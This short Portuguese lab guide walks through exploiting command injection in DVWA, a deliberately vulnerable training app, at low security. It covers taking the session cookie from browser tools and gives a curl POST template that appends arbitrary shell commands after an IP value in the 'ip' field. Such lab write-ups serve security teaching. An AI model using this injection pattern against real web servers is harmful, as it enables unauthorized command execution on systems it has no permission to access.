# Documentação de Experimentos: Exploração de Command Injection

Esta documentação detalha os passos para reproduzir a exploração de uma vulnerabilidade de Command Injection no DVWA

## Pré-requisitos
1.  **Ambiente**: DVWA rodando e acessível.
2.  **Autenticação**: É necessário estar logado na aplicação. O cookie de sessão (`PHPSESSID`) deve ser obtido via ferramentas de desenvolvedor do navegador (F12 > Application > Cookies) após o login.
3.  **Configuração de Segurança**: DVWA configurado com nível de segurança `Low`.

## Passo a Passo da Exploração
### 1. Detecção da Vulnerabilidade
Identificar qual pasta do endereço está vulnerável para aceitar comandos de terminal (comandos que aceitam endereço IP)

### 2. Rodar comando de interação com o IP do alvo

**Comando**
```bash
curl -X POST "http://URL_DO_SITE/"  -H "Cookie: PHPSESSID=SEU_COOKIE; security=low" --data "ip=QUALQUER_IP;[ COMANDOS DE TERMINAL ]; Submit=Submit" 
```
